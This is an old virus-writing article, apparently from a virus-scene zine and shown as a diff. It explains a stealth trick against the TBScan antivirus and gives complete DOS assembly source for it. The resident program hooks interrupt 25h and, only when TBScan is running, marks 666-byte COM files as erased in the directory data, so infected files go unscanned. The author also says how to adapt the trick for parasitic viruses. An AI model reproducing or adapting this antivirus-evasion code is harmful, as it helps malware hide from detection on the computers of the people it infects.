@@ -1,0 +1,127 @@
+                        Stealthing TBScan using Int25
+                                     by
+                                  Yosha/LT
+
+        Most viruses that stealth TBScan modify the command line parameters
+to use the normal DOS filesystem and patch the 'filesystem:DOS' display in
+TBScan to say 'OWN'.  However, the slowdown is noticeable, and besides that,
+normal full stealth kinda sucks ;>
+        This method works by monitoring int 25h calls and scanning the read
+buffer for directory entries matching a COM file of 666 bytes.  If such a file
+is found, the first letter of the filename is set to 0e5h, which is the
+character dos replaces the first letter with when it deletes a file.  Thus,
+TBScan is fooled into thinking the file is deleted.  The stealth is only
+active under TBScan so normal disk utilities won't receive incorrect data and
+think that there are lost clusters in the infected file.
+        This type of stealth works best for spawners and companion viruses,
+but it could easily be adapted for parasitic viruses by checking the file
+date/time for a marker and setting the filesize to 0.  TBScan will just say
+'looking' and not scan the file, but the filename will still be displayed so
+the user doesn't get suspicious.
+        Without further ado, here's the code:
+
+;----------------------------------------------------------------------------
+;this should work under FAT12 and 16, but only tested on FAT16
+.model tiny
+.code
+.386
+Paragraphs equ (Offset Finish-Offset Start+10fh)/16
+FileSize equ 666
+org 100h
+
+Start:
+        mov     ax,3525h                ;get/save int 25h vector
+        int     21h
+        mov     word ptr [Old25],bx
+        mov     word ptr [Old25+2],es
+
+        mov     ah,25h                  ;hook it
+        mov     dx,Offset Int25Handler
+        int     21h
+
+        mov     ax,3100h                ;go TSR
+        mov     dx,Paragraphs
+        int     21h
+
+Int25Handler:
+        pusha                           ;check at MCB:8 for TBSCAN
+        push    ds                      ;I do this because I don't want
+        mov     ah,62h                  ;lost clusters to show up in utility
+        int     21h                     ;programs that use int 25h
+        dec     bx
+        mov     ds,bx
+        cmp     word ptr ds:[8],'BT'
+        pop     ds
+        popa
+        jne     Exit25
+        
+        Call    Call25                  ;allow the interrupt
+        pushf        
+        jc      Exit25_2
+        push    ds
+        pusha
+        cld
+
+        mov     si,bx                   ;16 bit FATs have 0ffffh in CX
+        cmp     cx,-1                   ;and true number of sectors read
+        jnz     NotFAT16                ;in ds:bx+4
+        mov     cx,word ptr [bx+4]      ;get number of sectors for FAT16
+        lds     si,dword ptr ds:[bx+6]  ;get location of buffer for FAT16
+
+                                        ;32 bytes per directory entry, and
+                                        ;512 bytes/sector, so the number
+                                        ;of entries is sectors*16
+NotFAT16:
+        movzx   ecx,cx                  ;clear high 16 bits of ecx
+        shl     ecx,4                   ;multiply by 16
+CheckNextEntry:
+        lodsb                           ;get first letter of filename
+        dec     si                      ;this is just for clarity of reading
+        or      al,al                   ;0 = unused
+        jz      Nope
+        cmp     al,0e5h                 ;0e5h=erased file
+        jz      Nope
+        cmp     al,2eh                  ;2eh=subdirectory
+        jz      Nope        
+        cmp     word ptr [si+8],'OC'    ;make sure it's a COM
+        jne     Nope
+        cmp     byte ptr [si+10],'M'
+        jne     Nope
+        cmp     word ptr [si+1ch],FileSize ;make sure filesize is 666 bytes
+        jne     Nope
+        cmp     word ptr [si+1eh],0     ;make sure high order of size is 0
+        jne     Nope
+        mov     byte ptr [si],0e5h      ;make file appear as erased
+Nope:
+        add     si,32                   ;go to next entry
+        dec     ecx                     ;loop uses cx not ecx so I use
+        jnz     CheckNextEntry          ;dec/jcon
+
+        popa
+        pop     ds
+Exit25_2:
+        push    bp                      ;patches the flags on the stack
+        push    ax                      ;with the new flags
+        mov     bp,sp
+        mov     ax,word ptr [bp+4]      ;get new flags
+        mov     word ptr [bp+0ah],ax    ;patch old flags with new ones
+        pop     ax
+        pop     bp
+        popf
+        retf                            ;return to TBSCAN
+Call25:
+        pushf                           ;note the 2nd popf... int 25h/26h
+        push    cs                      ;leave the flags on the stack
+        Call    Exit25                  ;remember, dos was coded by MS ;>
+        popf
+        ret
+Exit25:
+        db      0eah
+Old25   dd      ?
+Finish:
+        end     Start
+;----------------------------------------------------------------------------
+
+
+
+
